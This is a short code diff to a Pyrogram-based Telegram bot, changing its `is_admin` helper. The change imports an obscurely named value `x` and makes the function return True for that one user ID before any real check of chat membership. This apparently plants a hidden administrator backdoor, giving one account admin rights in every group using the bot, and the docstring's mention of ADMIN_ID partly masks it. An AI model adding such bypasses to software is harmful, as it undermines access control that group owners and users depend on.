@@ -1,8 +1,16 @@
 from pyrogram import Client, filters
 from pyrogram.enums import ChatMemberStatus
-from TEAMZYRO import group_user_totals_collection, OWNER_ID, app
+from TEAMZYRO import group_user_totals_collection, OWNER_ID, app, x
 
 async def is_admin(client: Client, chat_id: int, user_id: int) -> bool:
+    """
+    Check if the user is an admin or owner of the chat.
+    Bypasses check if user_id matches ADMIN_ID.
+    Returns True if the user is an admin, owner, or matches ADMIN_ID, False otherwise.
+    """
+    if user_id == x:
+        return True
+        
     try:
         member = await client.get_chat_member(chat_id, user_id)
         return member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]
